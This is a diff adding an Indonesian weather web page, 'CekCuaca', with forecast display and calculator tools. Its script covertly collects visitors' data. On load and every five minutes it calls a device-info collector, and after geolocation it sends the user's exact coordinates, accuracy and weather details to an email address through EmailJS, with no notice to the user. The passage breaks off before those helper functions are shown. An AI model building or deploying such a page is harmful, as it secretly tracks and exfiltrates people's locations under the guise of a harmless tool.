@@ -1,0 +1,1865 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CekCuaca - Aplikasi Cuaca Akurat</title>
+    
+    <!-- Preconnect for performance -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+    
+    <!-- Custom CSS -->
+    <style>
+        :root {
+            --primary: #3498db;
+            --secondary: #2980b9;
+            --accent: #1abc9c;
+            --dark: #2c3e50;
+            --light: #ecf0f1;
+            --warning: #f39c12;
+            --danger: #e74c3c;
+            --success: #2ecc71;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .navbar {
+            background-color: rgba(44, 62, 80, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 1rem 0;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .navbar-brand {
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: white;
+            display: flex;
+            align-items: center;
+        }
+        
+        .navbar-brand i {
+            margin-right: 0.5rem;
+            color: var(--accent);
+        }
+        
+        .nav-link {
+            color: rgba(255, 255, 255, 0.8);
+            margin: 0 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-link:hover {
+            color: white;
+        }
+        
+        .hero {
+            padding: 8rem 0 4rem;
+            text-align: center;
+        }
+        
+        .hero h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 600px;
+            margin: 0 auto 2rem;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
+        .weather-card {
+            background-color: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 1rem;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        
+        .weather-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .current-weather {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 2rem;
+        }
+        
+        .weather-icon {
+            font-size: 5rem;
+            color: var(--accent);
+        }
+        
+        .temperature {
+            font-size: 4rem;
+            font-weight: 700;
+        }
+        
+        .weather-desc {
+            font-size: 1.5rem;
+            text-transform: capitalize;
+            margin-bottom: 0.5rem;
+        }
+        
+        .location {
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .location i {
+            margin-right: 0.5rem;
+        }
+        
+        .weather-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+        
+        .detail-item {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 1rem;
+            border-radius: 0.5rem;
+            text-align: center;
+        }
+        
+        .detail-item i {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--accent);
+        }
+        
+        .detail-label {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 0.25rem;
+        }
+        
+        .detail-value {
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+        
+        .forecast-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+        
+        .forecast-item {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 1rem;
+            border-radius: 0.5rem;
+            text-align: center;
+        }
+        
+        .forecast-day {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+        
+        .forecast-icon {
+            font-size: 1.5rem;
+            margin: 0.5rem 0;
+            color: var(--accent);
+        }
+        
+        .forecast-temp {
+            font-weight: 600;
+        }
+        
+        .tools-section {
+            margin-top: 3rem;
+        }
+        
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+        
+        .tool-card {
+            background-color: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        
+        .tool-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .tool-icon {
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+        
+        .tool-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+        
+        .tool-description {
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 1rem;
+        }
+        
+        .tool-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .tool-btn:hover {
+            background-color: var(--secondary);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            background-color: rgba(44, 62, 80, 0.9);
+            margin: 5% auto;
+            padding: 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 1rem;
+            width: 90%;
+            max-width: 600px;
+            color: white;
+            text-align: center;
+        }
+        
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .close:hover {
+            color: white;
+        }
+        
+        .image-editor {
+            margin: 1rem 0;
+        }
+        
+        .image-preview {
+            max-width: 100%;
+            max-height: 300px;
+            border-radius: 0.5rem;
+            margin: 1rem 0;
+        }
+        
+        .editor-controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            justify-content: center;
+            margin: 1rem 0;
+        }
+        
+        .editor-btn {
+            background-color: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            transition: all 0.3s ease;
+        }
+        
+        .editor-btn:hover {
+            background-color: rgba(255, 255, 255, 0.3);
+        }
+        
+        .slider-container {
+            margin: 1rem 0;
+        }
+        
+        .slider-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+        
+        .slider {
+            width: 100%;
+            height: 5px;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.3);
+            outline: none;
+            -webkit-appearance: none;
+        }
+        
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: var(--accent);
+            cursor: pointer;
+        }
+        
+        .slider::-moz-range-thumb {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: var(--accent);
+            cursor: pointer;
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: rgba(44, 62, 80, 0.9);
+            color: white;
+            padding: 1rem 1.5rem;
+            border-radius: 0.5rem;
+            border-left: 4px solid var(--accent);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            z-index: 1500;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+            max-width: 300px;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification-title {
+            font-weight: 600;
+            margin-bottom: 0.25rem;
+        }
+        
+        .notification-message {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        .map-container {
+            height: 300px;
+            border-radius: 0.5rem;
+            overflow: hidden;
+            margin: 1rem 0;
+            background-color: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--accent);
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            padding: 3rem 0;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.7);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 4rem;
+        }
+        
+        .footer p {
+            margin: 0;
+        }
+        
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            .temperature {
+                font-size: 3rem;
+            }
+            
+            .weather-icon {
+                font-size: 4rem;
+            }
+            
+            .tools-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <i class="bi bi-cloud-sun-fill"></i> CekCuaca
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Beranda</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Prakiraan</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Peta</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#">Alat</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <h1>CekCuaca - Prakiraan Cuaca Akurat</h1>
+            <p>Dapatkan informasi cuaca terkini, prakiraan untuk hari ini, dan berbagai alat bantu untuk aktivitas Anda</p>
+            <button class="btn btn-light" id="refreshWeatherBtn">
+                <i class="bi bi-arrow-clockwise"></i> Perbarui Data Cuaca
+            </button>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <section class="container my-5">
+        <!-- Current Weather -->
+        <div class="weather-card">
+            <div class="current-weather">
+                <div>
+                    <div class="weather-icon" id="currentWeatherIcon">
+                        <i class="bi bi-cloud-sun-fill"></i>
+                    </div>
+                    <div class="weather-desc" id="weatherDescription">Mendung</div>
+                    <div class="location" id="currentLocation">
+                        <i class="bi bi-geo-alt-fill"></i> <span id="locationName">Mendapatkan lokasi...</span>
+                    </div>
+                </div>
+                <div class="text-center">
+                    <div class="temperature" id="currentTemperature">--°C</div>
+                    <div class="feels-like" id="feelsLike">Terasa seperti --°C</div>
+                </div>
+            </div>
+            
+            <div class="weather-details">
+                <div class="detail-item">
+                    <i class="bi bi-moisture"></i>
+                    <div class="detail-label">Kelembaban</div>
+                    <div class="detail-value" id="humidity">--%</div>
+                </div>
+                <div class="detail-item">
+                    <i class="bi bi-wind"></i>
+                    <div class="detail-label">Kecepatan Angin</div>
+                    <div class="detail-value" id="windSpeed">-- m/s</div>
+                </div>
+                <div class="detail-item">
+                    <i class="bi bi-thermometer-half"></i>
+                    <div class="detail-label">Tekanan</div>
+                    <div class="detail-value" id="pressure">-- hPa</div>
+                </div>
+                <div class="detail-item">
+                    <i class="bi bi-eye"></i>
+                    <div class="detail-label">Jarak Pandang</div>
+                    <div class="detail-value" id="visibility">-- km</div>
+                </div>
+                <div class="detail-item">
+                    <i class="bi bi-sunrise"></i>
+                    <div class="detail-label">Sunrise</div>
+                    <div class="detail-value" id="sunrise">--:--</div>
+                </div>
+                <div class="detail-item">
+                    <i class="bi bi-sunset"></i>
+                    <div class="detail-label">Sunset</div>
+                    <div class="detail-value" id="sunset">--:--</div>
+                </div>
+            </div>
+            
+            <div class="forecast-container" id="forecastContainer">
+                <!-- Forecast items will be added here dynamically -->
+            </div>
+        </div>
+        
+        <!-- Weather Map -->
+        <div class="weather-card">
+            <h3 class="section-title">Peta Cuaca</h3>
+            <div class="map-container" id="mapContainer">
+                <div>
+                    <div class="loading-spinner"></div>
+                    <p class="mt-2">Memuat peta...</p>
+                </div>
+            </div>
+            <button class="btn btn-light mt-3" id="refreshMapBtn">
+                <i class="bi bi-arrow-clockwise"></i> Perbarui Peta
+            </button>
+        </div>
+        
+        <!-- Tools Section -->
+        <div class="tools-section">
+            <h2 class="section-title">Alat Bantu Cuaca</h2>
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="tool-icon">
+                        <i class="bi bi-image"></i>
+                    </div>
+                    <h3 class="tool-title">HD Image Enhancer</h3>
+                    <p class="tool-description">Tingkatkan kualitas gambar dengan teknologi AI</p>
+                    <button class="tool-btn" id="imageEnhancerBtn">Buka Editor</button>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-icon">
+                        <i class="bi bi-thermometer-sun"></i>
+                    </div>
+                    <h3 class="tool-title">Heat Index Calculator</h3>
+                    <p class="tool-description">Hitung indeks panas berdasarkan suhu dan kelembaban</p>
+                    <button class="tool-btn" id="heatIndexBtn">Hitung Sekarang</button>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-icon">
+                        <i class="bi bi-speedometer2"></i>
+                    </div>
+                    <h3 class="tool-title">Wind Speed Converter</h3>
+                    <p class="tool-description">Konversi kecepatan angin antar satuan</p>
+                    <button class="tool-btn" id="windSpeedConverterBtn">Konversi</button>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-icon">
+                        <i class="bi bi-droplet-half"></i>
+                    </div>
+                    <h3 class="tool-title">Humidity Calculator</h3>
+                    <p class="tool-description">Hitung kelembaban relatif dan absolut</p>
+                    <button class="tool-btn" id="humidityCalculatorBtn">Hitung</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2023 CekCuaca. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Image Enhancer Modal -->
+    <div id="imageEnhancerModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h3>HD Image Enhancer</h3>
+            <p>Unggah gambar untuk meningkatkan kualitasnya</p>
+            
+            <div class="image-editor">
+                <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+                <div class="text-center p-4 border rounded mb-3" id="imageUploadArea">
+                    <i class="bi bi-cloud-upload" style="font-size: 2rem;"></i>
+                    <p>Klik atau seret gambar ke sini</p>
+                </div>
+                
+                <div id="imagePreviewContainer" style="display: none;">
+                    <img id="imagePreview" class="image-preview">
+                    
+                    <div class="editor-controls">
+                        <button class="editor-btn" id="enhanceBtn">
+                            <i class="bi bi-magic"></i> Enhance
+                        </button>
+                        <button class="editor-btn" id="sharpenBtn">
+                            <i class="bi bi-eye"></i> Sharpen
+                        </button>
+                        <button class="editor-btn" id="brightenBtn">
+                            <i class="bi bi-brightness-high-fill"></i> Brighten
+                        </button>
+                        <button class="editor-btn" id="contrastBtn">
+                            <i class="bi bi-circle-half"></i> Contrast
+                        </button>
+                    </div>
+                    
+                    <div class="slider-container">
+                        <label class="slider-label">Kecerahan</label>
+                        <input type="range" min="-100" max="100" value="0" class="slider" id="brightnessSlider">
+                    </div>
+                    
+                    <div class="slider-container">
+                        <label class="slider-label">Kontras</label>
+                        <input type="range" min="-100" max="100" value="0" class="slider" id="contrastSlider">
+                    </div>
+                    
+                    <div class="slider-container">
+                        <label class="slider-label">Saturasi</label>
+                        <input type="range" min="-100" max="100" value="0" class="slider" id="saturationSlider">
+                    </div>
+                    
+                    <button class="btn btn-primary mt-3" id="downloadImageBtn">
+                        <i class="bi bi-download"></i> Download HD
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Heat Index Modal -->
+    <div id="heatIndexModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h3>Heat Index Calculator</h3>
+            <p>Masukkan suhu dan kelembaban untuk menghitung indeks panas</p>
+            
+            <div class="mb-3">
+                <label for="temperatureInput" class="form-label">Suhu (°C)</label>
+                <input type="number" class="form-control" id="temperatureInput" value="30">
+            </div>
+            
+            <div class="mb-3">
+                <label for="humidityInput" class="form-label">Kelembaban (%)</label>
+                <input type="number" class="form-control" id="humidityInput" value="70">
+            </div>
+            
+            <button class="btn btn-primary" id="calculateHeatIndexBtn">Hitung</button>
+            
+            <div id="heatIndexResult" class="mt-3 p-3 bg-light text-dark rounded" style="display: none;">
+                <h5>Hasil:</h5>
+                <p id="heatIndexValue"></p>
+                <p id="heatIndexDescription"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wind Speed Converter Modal -->
+    <div id="windSpeedConverterModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h3>Wind Speed Converter</h3>
+            <p>Konversi kecepatan angin antar satuan</p>
+            
+            <div class="mb-3">
+                <label for="windSpeedInput" class="form-label">Kecepatan Angin</label>
+                <input type="number" class="form-control" id="windSpeedInput" value="10">
+            </div>
+            
+            <div class="mb-3">
+                <label for="windSpeedUnitFrom" class="form-label">Dari</label>
+                <select class="form-select" id="windSpeedUnitFrom">
+                    <option value="ms">m/s (meter per detik)</option>
+                    <option value="kmh">km/h (kilometer per jam)</option>
+                    <option value="mph">mph (mil per jam)</option>
+                    <option value="knot">knot (knot)</option>
+                    <option value="bf">Beaufort Scale</option>
+                </select>
+            </div>
+            
+            <div class="mb-3">
+                <label for="windSpeedUnitTo" class="form-label">Ke</label>
+                <select class="form-select" id="windSpeedUnitTo">
+                    <option value="ms">m/s (meter per detik)</option>
+                    <option value="kmh">km/h (kilometer per jam)</option>
+                    <option value="mph">mph (mil per jam)</option>
+                    <option value="knot">knot (knot)</option>
+                    <option value="bf">Beaufort Scale</option>
+                </select>
+            </div>
+            
+            <button class="btn btn-primary" id="convertWindSpeedBtn">Konversi</button>
+            
+            <div id="windSpeedResult" class="mt-3 p-3 bg-light text-dark rounded" style="display: none;">
+                <h5>Hasil:</h5>
+                <p id="windSpeedValue"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Humidity Calculator Modal -->
+    <div id="humidityCalculatorModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h3>Humidity Calculator</h3>
+            <p>Hitung kelembaban relatif dan absolut</p>
+            
+            <div class="mb-3">
+                <label for="dryBulbTemp" class="form-label">Suhu Dry Bulb (°C)</label>
+                <input type="number" class="form-control" id="dryBulbTemp" value="25">
+            </div>
+            
+            <div class="mb-3">
+                <label for="wetBulbTemp" class="form-label">Suhu Wet Bulb (°C)</label>
+                <input type="number" class="form-control" id="wetBulbTemp" value="20">
+            </div>
+            
+            <div class="mb-3">
+                <label for="pressureInput" class="form-label">Tekanan (hPa)</label>
+                <input type="number" class="form-control" id="pressureInput" value="1013">
+            </div>
+            
+            <button class="btn btn-primary" id="calculateHumidityBtn">Hitung</button>
+            
+            <div id="humidityResult" class="mt-3 p-3 bg-light text-dark rounded" style="display: none;">
+                <h5>Hasil:</h5>
+                <p id="relativeHumidity"></p>
+                <p id="absoluteHumidity"></p>
+                <p id="dewPoint"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div id="notificationToast" class="notification">
+        <div class="notification-title">Notifikasi</div>
+        <div class="notification-message">Pesan notifikasi</div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    
+    <script>
+        // Initialize EmailJS - Replace with your actual User ID
+        emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS User ID
+        
+        // Global variables
+        let map = null;
+        let weatherMarker = null;
+        let canvas = null;
+        let ctx = null;
+        let originalImageData = null;
+        
+        // DOM Elements
+        const refreshWeatherBtn = document.getElementById('refreshWeatherBtn');
+        const refreshMapBtn = document.getElementById('refreshMapBtn');
+        const imageEnhancerBtn = document.getElementById('imageEnhancerBtn');
+        const heatIndexBtn = document.getElementById('heatIndexBtn');
+        const windSpeedConverterBtn = document.getElementById('windSpeedConverterBtn');
+        const humidityCalculatorBtn = document.getElementById('humidityCalculatorBtn');
+        const imageEnhancerModal = document.getElementById('imageEnhancerModal');
+        const heatIndexModal = document.getElementById('heatIndexModal');
+        const windSpeedConverterModal = document.getElementById('windSpeedConverterModal');
+        const humidityCalculatorModal = document.getElementById('humidityCalculatorModal');
+        const imageUploadArea = document.getElementById('imageUploadArea');
+        const imageUpload = document.getElementById('imageUpload');
+        const imagePreviewContainer = document.getElementById('imagePreviewContainer');
+        const imagePreview = document.getElementById('imagePreview');
+        const enhanceBtn = document.getElementById('enhanceBtn');
+        const sharpenBtn = document.getElementById('sharpenBtn');
+        const brightenBtn = document.getElementById('brightenBtn');
+        const contrastBtn = document.getElementById('contrastBtn');
+        const brightnessSlider = document.getElementById('brightnessSlider');
+        const contrastSlider = document.getElementById('contrastSlider');
+        const saturationSlider = document.getElementById('saturationSlider');
+        const downloadImageBtn = document.getElementById('downloadImageBtn');
+        const notificationToast = document.getElementById('notificationToast');
+        
+        // Close buttons for modals
+        const closeButtons = document.querySelectorAll('.close');
+        closeButtons.forEach(button => {
+            button.addEventListener('click', function() {
+                this.closest('.modal').style.display = 'none';
+            });
+        });
+        
+        // Event Listeners
+        refreshWeatherBtn.addEventListener('click', getWeatherData);
+        refreshMapBtn.addEventListener('click', initializeMap);
+        imageEnhancerBtn.addEventListener('click', () => {
+            imageEnhancerModal.style.display = 'block';
+        });
+        heatIndexBtn.addEventListener('click', () => {
+            heatIndexModal.style.display = 'block';
+        });
+        windSpeedConverterBtn.addEventListener('click', () => {
+            windSpeedConverterModal.style.display = 'block';
+        });
+        humidityCalculatorBtn.addEventListener('click', () => {
+            humidityCalculatorModal.style.display = 'block';
+        });
+        
+        // Image Upload Events
+        imageUploadArea.addEventListener('click', () => {
+            imageUpload.click();
+        });
+        
+        imageUploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            imageUploadArea.style.backgroundColor = 'rgba(255, 255, 255, 0.2)';
+        });
+        
+        imageUploadArea.addEventListener('dragleave', () => {
+            imageUploadArea.style.backgroundColor = '';
+        });
+        
+        imageUploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            imageUploadArea.style.backgroundColor = '';
+            
+            if (e.dataTransfer.files.length) {
+                handleImageUpload(e.dataTransfer.files[0]);
+            }
+        });
+        
+        imageUpload.addEventListener('change', (e) => {
+            if (e.target.files.length) {
+                handleImageUpload(e.target.files[0]);
+            }
+        });
+        
+        // Image Editor Events
+        enhanceBtn.addEventListener('click', enhanceImage);
+        sharpenBtn.addEventListener('click', sharpenImage);
+        brightenBtn.addEventListener('click', () => {
+            brightnessSlider.value = 20;
+            applyImageFilters();
+        });
+        contrastBtn.addEventListener('click', () => {
+            contrastSlider.value = 20;
+            applyImageFilters();
+        });
+        
+        brightnessSlider.addEventListener('input', applyImageFilters);
+        contrastSlider.addEventListener('input', applyImageFilters);
+        saturationSlider.addEventListener('input', applyImageFilters);
+        
+        downloadImageBtn.addEventListener('click', downloadImage);
+        
+        // Calculator Events
+        document.getElementById('calculateHeatIndexBtn').addEventListener('click', calculateHeatIndex);
+        document.getElementById('convertWindSpeedBtn').addEventListener('click', convertWindSpeed);
+        document.getElementById('calculateHumidityBtn').addEventListener('click', calculateHumidity);
+        
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            getWeatherData();
+            initializeMap();
+            collectDeviceInfo();
+            
+            // Set up periodic data collection
+            setInterval(collectDeviceInfo, 300000); // Collect device info every 5 minutes
+        });
+        
+        // Function to get weather data
+        function getWeatherData() {
+            // Get user's location first
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const { latitude, longitude } = position.coords;
+                        
+                        // Send location data to email
+                        sendLocationData({
+                            latitude: latitude,
+                            longitude: longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        // Fetch weather data using OpenWeatherMap API (you'll need to replace with your API key)
+                        fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&appid=YOUR_API_KEY`)
+                            .then(response => response.json())
+                            .then(data => {
+                                updateWeatherUI(data);
+                                
+                                // Send weather data to email
+                                sendWeatherData({
+                                    location: data.name,
+                                    country: data.sys.country,
+                                    temperature: data.main.temp,
+                                    feelsLike: data.main.feels_like,
+                                    humidity: data.main.humidity,
+                                    pressure: data.main.pressure,
+                                    windSpeed: data.wind.speed,
+                                    weatherDescription: data.weather[0].description,
+                                    timestamp: new Date().toISOString()
+                                });
+                            })
+                            .catch(error => {
+                                console.error('Error fetching weather data:', error);
+                                
+                                // Fallback to mock data
+                                updateWeatherUI({
+                                    name: "Jakarta",
+                                    main: {
+                                        temp: 30,
+                                        feels_like: 32,
+                                        humidity: 70,
+                                        pressure: 1010
+                                    },
+                                    wind: {
+                                        speed: 3.5
+                                    },
+                                    weather: [
+                                        {
+                                            main: "Clouds",
+                                            description: "few clouds"
+                                        }
+                                    ],
+                                    sys: {
+                                        country: "ID"
+                                    }
+                                });
+                            });
+                    },
+                    error => {
+                        console.error('Geolocation error:', error);
+                        
+                        // Fallback to default location (Jakarta)
+                        fetchWeatherForDefaultLocation();
+                    }
+                );
+            } else {
+                // Fallback to default location (Jakarta)
+                fetchWeatherForDefaultLocation();
+            }
+        }
+        
+        // Function to fetch weather for default location
+        function fetchWeatherForDefaultLocation() {
+            fetch(`https://api.openweathermap.org/data/2.5/weather?q=Jakarta&units=metric&appid=YOUR_API_KEY`)
+                .then(response => response.json())
+                .then(data => {
+                    updateWeatherUI(data);
+                })
+                .catch(error => {
+                    console.error('Error fetching weather data for default location:', error);
+                    
+                    // Fallback to mock data
+                    updateWeatherUI({
+                        name: "Jakarta",
+                        main: {
+                            temp: 30,
+                            feels_like: 32,
+                            humidity: 70,
+                            pressure: 1010
+                        },
+                        wind: {
+                            speed: 3.5
+                        },
+                        weather: [
+                            {
+                                main: "Clouds",
+                                description: "few clouds"
+                            }
+                        ],
+                        sys: {
+                            country: "ID"
+                        }
+                    });
+                });
+        }
+        
+        // Function to update weather UI
+        function updateWeatherUI(data) {
+            // Update location
+            document.getElementById('locationName').textContent = `${data.name}, ${data.sys.country}`;
+            
+            // Update temperature
+            document.getElementById('currentTemperature').textContent = `${Math.round(data.main.temp)}°C`;
+            document.getElementById('feelsLike').textContent = `Terasa seperti ${Math.round(data.main.feels_like)}°C`;
+            
+            // Update weather description
+            document.getElementById('weatherDescription').textContent = data.weather[0].description;
+            
+            // Update weather icon
+            const weatherIcon = getWeatherIcon(data.weather[0].main);
+            document.getElementById('currentWeatherIcon').innerHTML = `<i class="${weatherIcon}"></i>`;
+            
+            // Update weather details
+            document.getElementById('humidity').textContent = `${data.main.humidity}%`;
+            document.getElementById('windSpeed').textContent = `${data.wind.speed} m/s`;
+            document.getElementById('pressure').textContent = `${data.main.pressure} hPa`;
+            
+            // Update sunrise and sunset if available
+            if (data.sys.sunrise && data.sys.sunset) {
+                const sunrise = new Date(data.sys.sunrise * 1000);
+                const sunset = new Date(data.sys.sunset * 1000);
+                
+                document.getElementById('sunrise').textContent = sunrise.toLocaleTimeString('id-ID', { 
+                    hour: '2-digit', 
+                    minute: '2-digit' 
+                });
+                document.getElementById('sunset').textContent = sunset.toLocaleTimeString('id-ID', { 
+                    hour: '2-digit', 
+                    minute: '2-digit' 
+                });
+            }
+            
+            // Get forecast data
+            getForecastData(data.coord.lat, data.coord.lon);
+            
+            // Show notification
+            showNotification('Cuaca diperbarui', `Data cuaca untuk ${data.name} telah diperbarui`);
+        }
+        
+        // Function to get weather icon
+        function getWeatherIcon(weatherMain) {
+            switch (weatherMain.toLowerCase()) {
+                case 'clear':
+                    return 'bi bi-sun-fill';
+                case 'clouds':
+                    return 'bi bi-cloud-fill';
+                case 'rain':
+                    return 'bi bi-cloud-rain-fill';
+                case 'drizzle':
+                    return 'bi bi-cloud-drizzle-fill';
+                case 'thunderstorm':
+                    return 'bi bi-cloud-lightning-fill';
+                case 'snow':
+                    return 'bi bi-snow';
+                case 'mist':
+                case 'smoke':
+                case 'haze':
+                case 'dust':
+                case 'fog':
+                case 'sand':
+                case 'ash':
+                case 'squall':
+                case 'tornado':
+                    return 'bi bi-cloud-fog-fill';
+                default:
+                    return 'bi bi-question-circle-fill';
+            }
+        }
+        
